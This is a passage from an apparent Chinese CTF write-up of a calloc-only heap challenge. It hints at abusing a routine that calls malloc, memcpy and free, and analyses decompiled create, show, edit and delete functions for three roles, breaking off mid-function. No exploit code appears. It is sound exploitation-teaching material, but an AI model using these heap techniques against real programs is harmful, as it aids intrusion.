class="line">&#125;</span><br></pre></td></tr></table></figure><p>当中调用了malloc然后memcpy到堆上，最后free掉，这样对于只存在calloc的程序可以说是毁灭性的打击。具体在题目中演示</p><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>题目依旧是菜单题，不同的是，题目是存在三个角色，每个角色在创建堆块和修改堆块时都是不一样的。</p><p>在这里先把角色的结构体给大家：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pig</span>&#123;</span></span><br><span class="line">    chunk_arr[<span class="number">24</span>];</span><br><span class="line">    chunk_size[<span class="number">24</span>];</span><br><span class="line">    chunk_exist[<span class="number">24</span>];</span><br><span class="line">    chunk_freed[<span class="number">24</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是第一个角色Peppa的create</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">create_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; *(a1 + <span class="number">8LL</span> * i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(users + <span class="number">84</span>) &lt;= <span class="number">143</span> )</span><br><span class="line">      *(users + <span class="number">84</span>) = <span class="number">144</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    v8 = input_int();</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= *(users + <span class="number">84</span>) &amp;&amp; v8 &lt;= <span class="number">0x430</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(users + <span class="number">0x54</span>) = v8;</span><br><span class="line">      *(a1 + <span class="number">8LL</span> * i) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v8);</span><br><span class="line">      <span class="keyword">if</span> ( !*(a1 + <span class="number">8LL</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(a1 + <span class="number">4</span> * (i + <span class="number">0x30</span>LL)) = v8;</span><br><span class="line">      *(a1 + i + <span class="number">0x120</span>) = <span class="number">0</span>;</span><br><span class="line">      *(a1 + i + <span class="number">0x138</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8 / <span class="number">48</span>; ++j )</span><br><span class="line">        sub_2DBC((*(a1 + <span class="number">8LL</span> * i) + <span class="number">48</span> * j), <span class="number">16LL</span>);</span><br><span class="line">      v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上面是让下一次创建的堆块必须大于或则等于上一次创建的，以及在后面的for循环里写入内容中间都会出现两行空白<code>sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);</code>。在第二个角色也就是Mummy，创建堆块的规则是一样的，不过写入内容是<code>sub_2DBC((*(a1 + 8LL * i) + 48 * j + 16LL), 16LL);</code></p><p>但是第三个角色有所区别：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">create_3</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span> &amp;&amp; *(a1 + <span class="number">8LL</span> * i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(users + <span class="number">256</span>) &lt;= <span class="number">143</span> )</span><br><span class="line">      *(users + <span class="number">256</span>) = <span class="number">144</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    v10 = input_int();</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">143</span> &amp;&amp; v10 &lt;= <span class="number">0x440</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(users + <span class="number">256</span>) = v10;</span><br><span class="line">      *(a1 + <span class="number">8LL</span> * i) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v10);</span><br><span class="line">      <span class="keyword">if</span> ( !*(a1 + <span class="number">8LL</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(a1 + <span class="number">4</span> * (i + <span class="number">48LL</span>)) = v10;</span><br><span class="line">      *(a1 + i + <span class="number">288</span>) = <span class="number">0</span>;</span><br><span class="line">      *(a1 + i + <span class="number">312</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v10 / <span class="number">48</span>; ++j )</span><br><span class="line">        sub_2DBC((*(a1 + <span class="number">8LL</span> * i) + <span class="number">48</span> * j + <span class="number">32LL</span>), <span class="number">16LL</span>);</span><br><span class="line">      v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0xE8</span>uLL);</span><br><span class="line">        v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;01dwang&#x27;s Gift:&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        sub_2D09(v11, <span class="number">0xE8</span>LL);</span><br><span class="line">        v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里虽然是记录了上一个chunk的size但是并没有让后面的chunk的size必须大于等于上一个的。而且这里输入内容是这样的<code>sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);</code></p><p>通过上面可以看到peppa能够创建20个chunk，但是mummy只能创建10个chunk，最后的daddy只能创建5个chunk，并且最后一个chunk还是固定大小但是可以连续的写入内容。另外三个角色创建的最大chunk的size分别为：0x430，0x450，0x440 <strong>并且可以看到上面只存在calloc来申请chunk</strong></p><p>三个的show函数都挺类似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">show_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  v4 = input_int();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">8LL</span> * v4) &amp;&amp; *(a1 + <span class="number">4</span> * (v4 + <span class="number">48LL</span>)) &amp;&amp; !*(a1 + v4 + <span class="number">288</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, *(a1 + <span class="number">8LL</span> * v4));</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到show函数只是验证了，chunk_arr不为空，chunk_size不为空，并且chunk_exist==0</p><p>再看edit函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">edit_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  v5 = input_int();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> &amp;&amp; v5 &lt;= <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">8LL</span> * v5) &amp;&amp; *(a1 + <span class="number">4</span> * (v5 + <span class="number">48LL</span>)) &amp;&amp; !*(a1 + v5 + <span class="number">288</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = *(a1 + <span class="number">4</span> * (v5 + <span class="number">48LL</span>)) / <span class="number">48</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !sub_2DBC((*(a1 + <span class="number">8LL</span> * v5) + <span class="number">48</span> * i), <span class="number">16LL</span>); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是peppa的edit函数，这里的输入方式其实和再创建chunk的时候是一样的，并且验证的方式和show函数一样。</p><p>最后就是delete函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">delete_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  v4 = input_int();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">8LL</span> * v4) &amp;&amp; !*(a1 + v4 + <span class="number">288</span>) &amp;&amp; !*(a1 + v4 + <span class="number">312</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(a1 + <span class="number">8LL</span> * v4));</span><br><span class="line">      *(a1 + v4 + <span class="number">288</span>) = <span class="number">1</span>;</span><br><span class="line">      *(a1 + v4 + <span class="number">312</span>) = <span class="number">1</span>;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    